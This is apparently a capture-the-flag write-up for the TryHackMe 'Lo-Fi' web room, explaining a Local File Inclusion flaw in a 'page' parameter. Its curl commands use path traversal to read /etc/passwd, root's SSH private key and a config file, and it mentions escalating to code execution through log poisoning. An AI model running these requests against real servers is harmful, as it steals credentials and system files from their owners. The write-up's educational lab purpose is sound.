# 🎵 Lo-Fi

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Lo-Fi](https://tryhackme.com/room/lofi) |
| **Difficulty** | 🟢 Easy |
| **Category** | Web |
| **OS** | Linux |
| **Tools** | Browser, Burp Suite, curl |

---

## 🎯 Objective

Exploit a Local File Inclusion (LFI) vulnerability to read sensitive files from the server.

---

## 🔍 Enumeration

The web application loads content via a `page` parameter:
```
http://TARGET_IP/?page=lofi
```

Testing for LFI:
```bash
curl "http://TARGET_IP/?page=../../../etc/passwd"
```

If the file contents are returned — LFI is confirmed.

---

## 💥 Exploitation

Reading system files:
```bash
# /etc/passwd — user enumeration
curl "http://TARGET_IP/?page=../../../etc/passwd"

# Flag location
curl "http://TARGET_IP/?page=../../../flag.txt"

# SSH keys
curl "http://TARGET_IP/?page=../../../root/.ssh/id_rsa"

# Web application config
curl "http://TARGET_IP/?page=../../../var/www/html/config.php"
```

**Flag found via LFI path traversal.**

---

## 📚 Lessons Learned

- LFI occurs when user input is directly used to include files without sanitization
- Path traversal sequences `../` can navigate outside the web root
- Always test LFI for `/etc/passwd`, log files, SSH keys, and config files
- LFI can escalate to RCE via log poisoning — inject PHP into access logs then include them

---
*by OwlRC 🦉 | github.com/OwlRC*
